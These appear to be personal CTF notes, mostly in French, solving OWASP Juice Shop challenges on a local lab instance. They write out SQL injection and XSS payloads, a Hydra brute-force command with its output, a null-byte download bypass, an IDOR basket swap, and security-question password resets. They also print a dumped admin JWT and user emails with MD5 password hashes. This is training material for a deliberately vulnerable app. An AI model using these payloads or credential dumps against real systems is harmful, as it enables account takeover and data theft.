CTF Juice shop
https://ex0a.medium.com/tryhackme-owasp-juice-shop-53e87fb1af36
https://medium.com/nerd-for-tech/owasp-juice-shop-level-2-2ead67a77b5e
https://pwning.owasp-juice.shop/appendix/solutions.html
https://www.cyberlife.blog/tryhackme-owasp-juice-shop/
https://www.hebunilhanli.com/wonderland/owasp-juice-shop-level-3-part-ii-writeup/
https://www.reddit.com/r/HowToHack/comments/s5k0hx/help_with_brute_forcing_a_password_with_hydra/
https://zacheller.dev/2-star-OWASP
https://bestestredteam.com/2018/07/07/juice-shop-walkthrough-2-star/
https://incognitjoe.github.io/hacking-the-juice-shop.html
https://curiositykillscolby.com/2020/11/03/pwning-owasps-juice-shop-pt-7-mc-safesearch/

login: ' or 1=1 --
mot de passe: a
Vous avez résolu avec succès un challenge : Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)

Faille XSS
<iframe src="javascript:alert(`xss`)">

payload: <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>

Se connecter sur un autre compte
login : bender@juice-sh.op'--
mdp : nimportequoi

ouvrir 10.0.1.43:8083/ftp pour trouver eastere.gg
ce fichier contient le lien vers un autre ficgier:
base64: L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
rot13: /gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
lol

reset le password d'emma:
dans la page login, forgot your password, trouver le premier lieu de travail d'emma, la photo se trouve dans la page contenant toutes les images et donc retrouver cet immeuble sur internet.
c'est ITsec
vous pouvez changez le pot de passe

connecter en admin, effacer dans la page administration, le commentaire qui a 5 étoiles (c'est tout)

dans la page complain, ajouter un fichier en xml (c'est tout)

Pour se connecter chez Mc SafeSearch, regarder cette vidéo, il dit le nom de son chien https://www.youtube.com/watch?v=v59CX2DiX0Y
Mr. Noodles mais mettre Mr. N00dles

se connecter en admin avec hydra:
`sudo hydra -l admin@juice-sh.op -P /home/anthony/Desktop/rockyou.txt 10.0.1.43 http-post-form '/#/login:email=^USER^&password=^PASS^:Invalid email or password.' -fV -s 8083 -t 1`
```
[ATTEMPT] target 10.0.1.43 - login "admin@juice-sh.op" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[8083][http-post-form] host: 10.0.1.43   login: admin@juice-sh.op   password: 123456
```

Dans un même navigateur, se connecter avec un login au choix, dans un autre onglet se connecter avec un autre login, pour le login1 acheter des trucs et dans le login2 aller dans la page contenant le panier des trucs
bref c'est le même token

reset jim password
jim adore start trek "quel est le nom de votre frere ou soeur ainé: Samuel (George Samuel Kirk)
mot de passe: jimjuice

aller dans le répertoire ftp et aller sur le lien package.json.bak dans la barre d'adresse rajouter %2500.md

burpsuite intercept en cliquant sur le "panier" et remplacer rest/basket/1 par rest/basket/2

aller dans les order history cliquer sur un logo de camion et mettre dans la barre d’adresse a la place des numéros, le code javascript <iframe src="javascript:alert(`xss`)">

le token: 
{"authentication":{"

token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTA5LTI5IDEzOjE3OjQyLjIyMyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTA5LTI5IDEzOjE3OjQyLjIyMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NjUzODk2ODcsImV4cCI6MTY2NTQwNzY4N30.WdrRL5Y0Xj8ESDP4sca4-rDIu82RgeRVtB9fkr-Pzl_krBuXmMT310Y4KIWrjWd8QPHMiS6e6Aujc1o7DBrsACZdz4qcpZK6l8WOITMY20I_T5oG4_cbOEETQau1PPB0AbEh-hRlLYk3VjI87_TkkmzeGVflNQ4B5Qu49mYy-LE","bid":1,"umail":"admin@juice-sh.op"

}}

les autres users

{"status":"success","data":[{"UserId":13,"id":1,"caption":"😼 #zatschi #whoneedsfourlegs","imagePath":"assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg","createdAt":"2022-09-29T13:17:44.138Z","updatedAt":"2022-09-29T13:17:44.138Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"9283f1b2e9669749081963be0462e466","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"0.0.0.0","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2022-09-29T13:17:42.242Z","updatedAt":"2022-09-29T13:17:42.242Z","deletedAt":null}},{"UserId":4,"id":2,"caption":"Magn(et)ificent!","imagePath":"assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg","createdAt":"2022-09-29T13:17:44.138Z","updatedAt":"2022-09-29T13:17:44.138Z","User":{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"6edd9d726cbdc873c539e41ae8757b8c","role":"admin","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2022-09-29T13:17:42.226Z","updatedAt":"2022-09-29T13:17:42.226Z","deletedAt":null}},{"UserId":4,"id":3,"caption":"My rare collectors item! [̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]","imagePath":"assets/public/images/uploads/my-rare-collectors-item!-[̲̅$̲̅(̲̅-͡°-͜ʖ-͡°̲̅)̲̅$̲̅]-1572603645543.jpg","createdAt":"2022-09-29T13:17:44.138Z","updatedAt":"2022-09-29T13:17:44.138Z","User":{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"6edd9d726cbdc873c539e41ae8757b8c","role":"admin","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2022-09-29T13:17:42.226Z","updatedAt":"2022-09-29T13:17:42.226Z","deletedAt":null}},{"UserId":18,"id":4,"caption":"I love going hiking here...","imagePath":"assets/public/images/uploads/favorite-hiking-place.png","createdAt":"2022-09-29T13:17:44.151Z","updatedAt":"2022-09-29T13:17:44.151Z","User":{"id":18,"username":"j0hNny","email":"john@juice-sh.op","password":"00479e957b6b42c459ee5746478e4d45","role":"customer","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2022-09-29T13:17:42.245Z","updatedAt":"2022-09-29T13:17:42.245Z","deletedAt":null}},{"UserId":19,"id":5,"caption":"My old workplace...","imagePath":"assets/public/images/uploads/IMG_4253.jpg","createdAt":"2022-09-29T13:17:44.154Z","updatedAt":"2022-09-29T13:17:44.154Z","User":{"id":19,"username":"E=ma²","email":"emma@juice-sh.op","password":"402f1c4a75e316afec5a6ea63147f739","role":"customer","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2022-09-29T13:17:42.245Z","updatedAt":"2022-09-29T13:17:42.245Z","deletedAt":null}}]}